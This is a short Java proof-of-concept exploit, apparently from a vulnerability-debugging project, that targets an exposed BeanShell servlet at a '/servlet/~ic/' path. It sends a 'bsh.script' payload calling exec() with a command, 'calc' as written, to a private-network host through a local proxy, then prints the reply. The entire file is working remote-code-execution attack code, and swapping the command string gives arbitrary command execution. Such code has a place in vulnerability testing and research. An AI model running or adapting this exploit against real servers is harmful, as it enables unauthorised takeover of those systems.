package cve.nc;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import com.pacemrc.vuldebug.common.utils.http.Response;
import org.apache.http.client.methods.HttpPost;

import java.io.IOException;
import java.net.URLEncoder;

public class BshServlet_RCE {

    public static void main(String[] args) throws IOException {

        String url = "http://10.58.120.201/servlet/~ic/bsh.servlet.BshServlet";
        String cmd = "calc";
        String body = "bsh.script=" + URLEncoder.encode("exec(\"" + cmd + "\");");

        HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
        HttpPost httpPost = new HttpPost(url);
        httpPost.addHeader("Content-Type","application/x-www-form-urlencoded");
        Response response = httpRequest.sendStringPost(httpPost, body);
        System.out.println(response.getStatusCode());
        System.out.println(response.getResponseBody());
    }
}
